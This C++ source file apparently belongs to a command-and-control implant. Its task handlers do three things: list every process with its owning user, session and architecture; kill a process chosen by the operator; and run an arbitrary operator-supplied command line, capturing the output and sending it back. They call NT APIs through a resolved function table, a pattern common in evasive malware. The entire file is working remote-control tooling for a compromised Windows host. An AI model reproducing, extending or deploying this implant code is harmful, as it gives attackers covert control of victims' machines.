#include "cmds.hpp"

void commanders::do_proc_list() {
	NTSTATUS stat;
	ULONG size = 0;
	PSYSTEM_PROCESS_INFORMATION spi = NULL;
	CLIENT_ID cid = { 0 };
	OBJECT_ATTRIBUTES oa;
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;

	PCHAR NameBuf = NULL;
	PCHAR DomainBuf = NULL;;
	DWORD NameLen = 0;
	DWORD DomainLen = 0;

	PBYTE buf = NULL;
	DWORD needed = 0;
	DWORD PID = 0;
	INT len = 0;


	g_ByteMgr->BeginTask();

	hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
	buf = AllocMemory<BYTE>(size);

	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	stat = hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, buf, size, &size);
	if (!NTAPI_SUCCESS(stat)) {
		g_ByteMgr->EndErr(ERROR_PS_LIST);
		goto CLEANUP;
	}

	spi = (PSYSTEM_PROCESS_INFORMATION)buf;


	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_PS_LIST);

	while (TRUE) {
		CHAR line[512] = { 0 };
		ULONG_PTR Wow = NULL;
		BOOL Arch = 67;


		if (!spi->ImageName.Buffer) {
			goto NEXT_ENTRY;
		}
		len = WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR), line, sizeof(line) - 32, NULL, NULL);
		PID = (DWORD)(ULONG_PTR)spi->UniqueProcessId;

		cid.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
		cid.UniqueThread = 0;

		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
		stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
		if (NTAPI_SUCCESS(stat)) {
			stat = hades->NtApis.NtOpenProcessToken(hProc, TOKEN_QUERY, &hToken);

			if (NTAPI_SUCCESS(stat)) {
				stat = hades->NtApis.NtQueryInformationProcess(hProc, ProcessWow64Information, &Wow, sizeof(ULONG_PTR), NULL);
				if (NTAPI_SUCCESS(stat)) {
					Arch = (Wow == 0);
				}

				hades->WinApis.GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
				PTOKEN_USER tokenUsr = AllocMemory<TOKEN_USER>(needed);

				if (hades->WinApis.GetTokenInformation(hToken, TokenUser, tokenUsr, needed, &needed)) {

					SID_NAME_USE sidType;
					NameLen = 0;
					DomainLen = 0;
					hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NULL, &NameLen, NULL, &DomainLen, &sidType);
					NameBuf = AllocMemory<CHAR>(NameLen);
					DomainBuf = AllocMemory<CHAR>(DomainLen);

					if (NameBuf && DomainBuf) {
						if (!hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
							NameLen = 0;
							DomainLen = 0;
						}
					}

				}
				HeapFree(GetProcessHeap(), 0, tokenUsr);
				hades->WinApis.CloseHandle(hToken);
			}
			hades->WinApis.CloseHandle(hProc);
		}

		// todo handle domain
		g_ByteMgr->Write4(len);
		g_ByteMgr->WriteString((PBYTE)line, len);
		g_ByteMgr->Write4(NameLen);
		if (NameLen > 0) g_ByteMgr->WriteString((PBYTE)NameBuf, NameLen);
		g_ByteMgr->Write4(DomainLen);
		if (DomainLen > 0) g_ByteMgr->WriteString((PBYTE)DomainBuf, DomainLen);
		g_ByteMgr->Write4(PID);
		g_ByteMgr->Write4(spi->SessionId);
		g_ByteMgr->Write4(Arch);

		if (NameBuf) { HeapFree(GetProcessHeap(), 0, NameBuf); NameBuf = NULL; }
		if (DomainBuf) { HeapFree(GetProcessHeap(), 0, DomainBuf); DomainBuf = NULL; }
		NameLen = 0;
		DomainLen = 0;


	NEXT_ENTRY:
		if (spi->NextEntryOffset == NULL) break;
		spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
	}
	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }


}


void commanders::do_proc_kill() {
	g_ByteMgr->BeginTask();

	UINT PID = g_ByteMgr->Read4();

	CLIENT_ID ci = { 0 };
	OBJECT_ATTRIBUTES oa;
	HANDLE hProc = NULL;
	NTSTATUS Stat;

	ci.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
	ci.UniqueThread = 0;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	Stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_TERMINATE, &oa, &ci);
	if (NTAPI_SUCCESS(Stat)) {
		hades->NtApis.NtTerminateProcess(hProc, 0);
		g_ByteMgr->EndOk(KILL_SUCCESS);
	}
	else {
		ULONG Code = hades->NtApis.RtlNtStatusToDosError(Stat);
		g_ByteMgr->EndErr(Code);
	}

	if (hProc) {
		hades->WinApis.CloseHandle(hProc);
	}


}




void commanders::do_exec() {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	HANDLE hRead = NULL, hWrite = NULL;
	si.cb = sizeof(si);

	g_ByteMgr->BeginTask();


	UINT ProcLen = g_ByteMgr->Read4();
	PCHAR Process = g_ByteMgr->ReadString(ProcLen);

	UINT CaptureOutput = g_ByteMgr->Read4();

	if (CaptureOutput) {
		sa.nLength = sizeof(sa);
		sa.bInheritHandle = TRUE;
		sa.lpSecurityDescriptor = NULL;

		if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
			return;
		}

		SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
		si.dwFlags = STARTF_USESTDHANDLES;
		si.hStdOutput = hWrite;
		si.hStdError = hWrite;
		si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	}

	if (!CreateProcessA(NULL, Process, NULL, NULL, CaptureOutput, 0, NULL, NULL, &si, &pi)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		hades->WinApis.CloseHandle(hRead);
		hades->WinApis.CloseHandle(hWrite);
		return;
	}
	if (!CaptureOutput) {
		hades->WinApis.CloseHandle(pi.hProcess);
		hades->WinApis.CloseHandle(pi.hThread);
		g_ByteMgr->EndOk(PROCESS_CREATE_SUCCESS);
		return;
	}

	hades->WinApis.CloseHandle(hWrite);
	DWORD len = 0, cap = 4096;
	PCHAR buf = AllocMemory<CHAR>(4096);
	if (buf) {
		CHAR temp[4096];
		DWORD nRead;
		while (hades->WinApis.ReadFile(hRead, temp, sizeof(temp), &nRead, NULL) && nRead > 0) {
			if (len + nRead + 1 > cap) {
				while (len + nRead + 1 > cap) cap *= 2;
				buf = (PCHAR)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, cap);
			}
			memcpy(buf + len, temp, nRead);
			len += nRead;
		}
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, len, (PBYTE)buf);

	hades->WinApis.CloseHandle(hRead);
	hades->WinApis.CloseHandle(pi.hProcess);
	hades->WinApis.CloseHandle(pi.hThread);

	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }





	//CreateProcessA(Process, Args, 


}